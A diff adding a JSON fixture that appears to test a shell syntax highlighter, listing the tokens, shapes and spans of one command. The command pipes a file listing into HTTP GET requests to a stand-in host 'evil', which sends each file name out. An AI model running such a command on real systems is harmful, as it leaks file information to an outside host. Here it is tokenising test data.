@@ -1,0 +1,106 @@
+[
+    {
+        "content": "ls",
+        "shape": "shape_internalcall",
+        "span": {
+            "start": 0,
+            "end": 2
+        }
+    },
+    {
+        "content": "|",
+        "shape": "shape_pipe",
+        "span": {
+            "start": 3,
+            "end": 4
+        }
+    },
+    {
+        "content": "each",
+        "shape": "shape_internalcall",
+        "span": {
+            "start": 5,
+            "end": 9
+        }
+    },
+    {
+        "content": "{|f| ",
+        "shape": "shape_closure",
+        "span": {
+            "start": 10,
+            "end": 15
+        }
+    },
+    {
+        "content": "http get",
+        "shape": "shape_internalcall",
+        "span": {
+            "start": 15,
+            "end": 23
+        }
+    },
+    {
+        "content": "$\"",
+        "shape": "shape_string_interpolation",
+        "span": {
+            "start": 24,
+            "end": 26
+        }
+    },
+    {
+        "content": "http://evil/",
+        "shape": "shape_string",
+        "span": {
+            "start": 26,
+            "end": 38
+        }
+    },
+    {
+        "content": "(",
+        "shape": "shape_block",
+        "span": {
+            "start": 38,
+            "end": 39
+        }
+    },
+    {
+        "content": "$f",
+        "shape": "shape_variable",
+        "span": {
+            "start": 39,
+            "end": 41
+        }
+    },
+    {
+        "content": "name",
+        "shape": "shape_string",
+        "span": {
+            "start": 42,
+            "end": 46
+        }
+    },
+    {
+        "content": ")",
+        "shape": "shape_block",
+        "span": {
+            "start": 46,
+            "end": 47
+        }
+    },
+    {
+        "content": "\"",
+        "shape": "shape_string_interpolation",
+        "span": {
+            "start": 47,
+            "end": 48
+        }
+    },
+    {
+        "content": " }",
+        "shape": "shape_closure",
+        "span": {
+            "start": 48,
+            "end": 50
+        }
+    }
+]
